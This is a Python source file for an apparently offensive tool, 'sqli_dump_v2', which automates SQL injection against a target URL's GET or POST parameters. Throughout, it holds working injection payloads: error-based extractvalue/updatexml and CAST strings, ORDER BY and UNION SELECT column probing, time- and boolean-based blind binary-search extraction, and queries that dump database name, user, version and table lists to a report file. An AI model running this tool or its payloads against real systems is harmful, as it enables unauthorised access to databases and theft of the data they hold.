"""sqli_dump_v2 — universal SQLi dumper: GET+POST, sniper payloads, WAF-aware"""
import time
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from pathlib import Path
from core.http import HttpClient
from core.sniper_payloads import SNIPER_SQLI, GROUPS


ERROR_MARKERS = [
    "sql syntax", "mysql_fetch", "xpath syntax", "double value out of range",
    "pg_query", "postgresql", "microsoft ole db", "conversion failed",
    "ora-", "sqlite3", "sqlstate", "unclosed quotation", "invalid input syntax",
]


class SqliDumpV2:
    def run(self, session, logger):
        target = session.target
        u = urlparse(target)
        get_params = parse_qs(u.query) or {}
        # POST fields из --extra post=... или если GET пуст
        post_fields = {}
        for x in session.extra:
            if x.startswith("post="):
                for pair in x[5:].split("&"):
                    k, _, v = pair.partition("=")
                    post_fields[k] = v
        if not post_fields and not get_params:
            get_params = {"id": ["1"]}

        http = HttpClient(session, logger)
        base_url = target.split("?")[0]

        print(f"[sqli_dump_v2] target: {target}")
        print(f"[sqli_dump_v2] GET params: {list(get_params.keys())}")
        print(f"[sqli_dump_v2] POST fields: {list(post_fields.keys())}")
        print()

        # baseline
        base = http.get(target) if get_params else http.post(base_url, data=post_fields)
        if not base:
            print("[sqli_dump_v2] no baseline")
            return {}
        base_len = len(base.content)
        base_time = self._baseline_time(http, target, get_params, post_fields, base_url)

        print(f"[sqli_dump_v2] baseline: {base.status_code} {base_len}b avg={base_time:.2f}s")

        # ==== Phase 1: найти injectable param ====
        print()
        print("=" * 60)
        print("PHASE 1: DETECT INJECTABLE PARAM")
        print("=" * 60)

        vuln = None  # {"where": "get"|"post", "param": name, "technique": type}

        # GET params
        for name in get_params:
            v = self._probe_param_get(http, u, get_params, name, base_len, base_time)
            if v:
                vuln = {"where": "get", "param": name, "technique": v["type"],
                        "payload": v["payload"], "dbms": v.get("dbms", "unknown")}
                print(f"\n[!] VULNERABLE GET/{name} — {v['type']} ({v.get('dbms', '?')})")
                logger.finding("sqli_dump_vuln", "critical",
                               f"GET {name} — {v['type']}")
                break

        # POST fields
        if not vuln:
            for name in post_fields:
                v = self._probe_param_post(http, base_url, post_fields, name,
                                            base_len, base_time)
                if v:
                    vuln = {"where": "post", "param": name, "technique": v["type"],
                            "payload": v["payload"], "dbms": v.get("dbms", "unknown")}
                    print(f"\n[!] VULNERABLE POST/{name} — {v['type']} ({v.get('dbms', '?')})")
                    logger.finding("sqli_dump_vuln", "critical",
                                   f"POST {name} — {v['type']}")
                    break

        if not vuln:
            print("\n[sqli_dump_v2] no injectable param found")
            return {"vulnerable": False}

        # ==== Phase 2: определить число колонок (если union) ====
        cols = 0
        if vuln["technique"] == "union":
            print()
            print("=" * 60)
            print("PHASE 2: DETECT COLUMN COUNT")
            print("=" * 60)
            cols = self._detect_columns(http, u, base_url, get_params, post_fields, vuln)
            print(f"[sqli_dump_v2] columns: {cols}")

        # ==== Phase 3: dump DB info ====
        print()
        print("=" * 60)
        print("PHASE 3: DUMP DATABASE INFO")
        print("=" * 60)

        out_dir = Path("reports") / "dump" / "sqli_v2"
        out_dir.mkdir(parents=True, exist_ok=True)
        dumped = {}

        queries = [
            ("database", "database()",       "mysql"),
            ("user",     "current_user()",   "mysql"),
            ("version",  "version()",        "mysql"),
            ("database", "@@version",        "mssql"),
            ("user",     "system_user",      "mssql"),
            ("version",  "version()",        "postgres"),
            ("user",     "current_user",     "postgres"),
        ]

        for label, expr, dbms in queries:
            val = self._extract_value(http, u, base_url, get_params, post_fields,
                                       vuln, expr, cols, base_len, base_time)
            if val:
                key = f"{label}_{dbms}"
                dumped[key] = val
                print(f"  ✓ {key} = {val[:100]}")
                logger.finding("sqli_dump_info", "critical", f"{key}={val[:100]}")

        # ==== Phase 4: таблицы ====
        print()
        print("=" * 60)
        print("PHASE 4: DUMP TABLES")
        print("=" * 60)

        tables = self._dump_tables(http, u, base_url, get_params, post_fields,
                                    vuln, cols, base_len, base_time, dumped.get("database_mysql", ""))
        if tables:
            dumped["tables"] = tables
            print(f"  ✓ tables: {tables[:10]}")
            logger.finding("sqli_dump_tables", "critical", tables[:200])

        # ==== Phase 5: сохранить ====
        out_file = out_dir / "dump.txt"
        lines = [f"# SQLi dump — {target}", ""]
        for k, v in dumped.items():
            lines.append(f"=== {k} ===")
            lines.append(str(v)[:3000])
            lines.append("")
        out_file.write_text("\n".join(lines))
        print(f"\n[sqli_dump_v2] saved {len(dumped)} items to {out_file}")

        return {"vulnerable": True, "vuln": vuln, "dumped": list(dumped.keys()),
                "columns": cols}

    # ==================== PROBE PARAMS ====================

    def _probe_param_get(self, http, u, params, name, base_len, base_time):
        """Test GET param with sniper payloads (error → time → union)."""
        for probe in SNIPER_SQLI:
            payload = probe["payload"]
            ptype = probe["type"]
            url = self._url_get(u, params, name, payload)
            t0 = time.time()
            r = http.get(url)
            dt = time.time() - t0
            if not r:
                continue

            if ptype == "error":
                low = r.text.lower()
                for m in ERROR_MARKERS:
                    if m in low:
                        return {"type": "error", "payload": payload,
                                "dbms": probe["dbms"], "marker": m}
            elif ptype == "time" and dt > base_time + 2.5:
                return {"type": "time", "payload": payload, "dbms": probe["dbms"]}
            elif ptype == "union" and abs(len(r.content) - base_len) > 50:
                return {"type": "union", "payload": payload, "dbms": probe["dbms"]}
        return None

    def _probe_param_post(self, http, base_url, fields, name, base_len, base_time):
        """Same for POST."""
        for probe in SNIPER_SQLI:
            payload = probe["payload"]
            ptype = probe["type"]
            data = dict(fields); data[name] = payload
            t0 = time.time()
            r = http.post(base_url, data=data)
            dt = time.time() - t0
            if not r:
                continue

            if ptype == "error":
                low = r.text.lower()
                for m in ERROR_MARKERS:
                    if m in low:
                        return {"type": "error", "payload": payload,
                                "dbms": probe["dbms"], "marker": m}
            elif ptype == "time" and dt > base_time + 2.5:
                return {"type": "time", "payload": payload, "dbms": probe["dbms"]}
            elif ptype == "union" and abs(len(r.content) - base_len) > 50:
                return {"type": "union", "payload": payload, "dbms": probe["dbms"]}
        return None

    # ==================== COLUMN COUNT ====================

    def _detect_columns(self, http, u, base_url, get_params, post_fields, vuln):
        """ORDER BY → union columns."""
        for n in range(1, 15):
            payload = f"' ORDER BY {n}-- -"
            r = self._send(http, u, base_url, get_params, post_fields, vuln, payload)
            if not r:
                break
            low = r.text.lower()
            if any(m in low for m in ERROR_MARKERS) or "order by" in low and "unknown" in low:
                return n - 1
        # fallback — union
        for n in range(1, 15):
            cols = ",".join([str(i) for i in range(1, n + 1)])
            payload = f"' UNION SELECT {cols}-- -"
            r = self._send(http, u, base_url, get_params, post_fields, vuln, payload)
            if r and not any(m in r.text.lower() for m in ERROR_MARKERS):
                return n
        return 0

    # ==================== EXTRACT VALUE ====================

    def _extract_value(self, http, u, base_url, get_params, post_fields,
                        vuln, expr, cols, base_len, base_time):
        """Try error-based, union-based, boolean/time-based extraction."""
        # 1. try error-based first (extractvalue/updatexml/convert)
        error_queries = [
            f"extractvalue(1,concat(0x7e,({expr}),0x7e))",
            f"updatexml(1,concat(0x7e,({expr}),0x7e),1)",
            f"1=CONVERT(int,({expr}))",
            f"1=CAST(({expr}) AS int)",
        ]
        for q in error_queries:
            payload = f"' AND {q}-- -"
            r = self._send(http, u, base_url, get_params, post_fields, vuln, payload)
            if not r:
                continue
            # извлекаем значение из ошибки
            m = re.search(r"~([^~]+)~", r.text)
            if m:
                return m.group(1)[:200]
            m = re.search(r"XPATH syntax error: '([^']+)'", r.text)
            if m:
                return m.group(1)[:200]
            m = re.search(r"(?:Conversion failed|invalid input syntax for type integer): \"?([^\"\n]+)", r.text)
            if m:
                return m.group(1)[:200]

        # 2. try union-based
        if cols > 0:
            nulls = ",".join(["NULL"] * cols)
            payloads = [
                f"' UNION SELECT {expr},{','.join(['NULL']*(cols-1))}-- -",
                f"' UNION SELECT {','.join(['NULL']*(cols-1))},{expr}-- -",
                f"' UNION ALL SELECT {expr},{','.join(['NULL']*(cols-1))}-- -",
            ]
            for p in payloads:
                r = self._send(http, u, base_url, get_params, post_fields, vuln, p)
                if r and len(r.content) > 0:
                    # извлекаем значение между тегами/спец-символами
                    text = re.sub(r'<[^>]+>', ' ', r.text)
                    # ищем строки с потенциальным значением (DB name, user, version)
                    matches = re.findall(r"[a-zA-Z0-9_.\-]{4,80}", text)
                    for m in matches:
                        if any(k in m.lower() for k in ["mysql", "postgres", "mssql",
                                                          "oracle", "sqlite", "root@",
                                                          "localhost", "admin"]):
                            return m[:200]

        # 3. boolean/time blind extraction
        if vuln["technique"] in ("boolean", "time") or cols == 0:
            return self._blind_extract_value(http, u, base_url, get_params,
                                              post_fields, vuln, expr,
                                              base_len, base_time)
        return None

    def _blind_extract_value(self, http, u, base_url, get_params, post_fields,
                              vuln, expr, base_len, base_time):
        """Binary search extraction."""
        result = ""
        for pos in range(1, 41):
            c = self._binary_char(http, u, base_url, get_params, post_fields,
                                   vuln, expr, pos, base_len, base_time)
            if not c or c == 0:
                break
            result += chr(c)
        return result.strip()

    def _binary_char(self, http, u, base_url, get_params, post_fields, vuln,
                      expr, pos, base_len, base_time):
        lo, hi = 32, 126
        while lo <= hi:
            mid = (lo + hi) // 2
            payload = f"' AND ASCII(SUBSTRING(({expr}),{pos},1))>{mid}-- -"
            r = self._send(http, u, base_url, get_params, post_fields, vuln, payload)
            if not r:
                return 0
            if vuln["technique"] == "boolean":
                if abs(len(r.content) - base_len) < 100:
                    lo = mid + 1
                else:
                    hi = mid - 1
            else:  # time — послать два запроса
                t0 = time.time()
                self._send(http, u, base_url, get_params, post_fields, vuln, payload)
                dt = time.time() - t0
                if dt > base_time + 2.0:
                    lo = mid + 1
                else:
                    hi = mid - 1
        return lo if 32 < lo < 127 else 0

    # ==================== TABLES ====================

    def _dump_tables(self, http, u, base_url, get_params, post_fields,
                      vuln, cols, base_len, base_time, dbname):
        """Extract tables via union or blind."""
        # Try GROUP_CONCAT (MySQL) / LISTAGG (Oracle) / STRING_AGG (PG) / FOR XML (MSSQL)
        queries = [
            "(SELECT GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=database())",
            "(SELECT STRING_AGG(table_name, ',') FROM information_schema.tables WHERE table_schema='public')",
            "(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')",
        ]
        for q in queries:
            val = self._extract_value(http, u, base_url, get_params, post_fields,
                                       vuln, q, cols, base_len, base_time)
            if val and len(val) > 3:
                return val[:500]
        return None

    # ==================== UTILS ====================

    def _send(self, http, u, base_url, get_params, post_fields, vuln, payload):
        """Send request through vuln param (GET or POST)."""
        if vuln["where"] == "get":
            url = self._url_get(u, get_params, vuln["param"], payload)
            return http.get(url)
        else:
            data = dict(post_fields); data[vuln["param"]] = payload
            return http.post(base_url, data=data)

    def _url_get(self, u, params, name, payload):
        q = dict(params); q[name] = [payload]
        return urlunparse(u._replace(query=urlencode(q, doseq=True)))

    def _baseline_time(self, http, url, get_params, post_fields, base_url, samples=3):
        times = []
        for _ in range(samples):
            t0 = time.time()
            if get_params:
                http.get(url)
            else:
                http.post(base_url, data=post_fields)
            times.append(time.time() - t0)
            time.sleep(0.15)
        return sum(times) / len(times) if times else 0.5
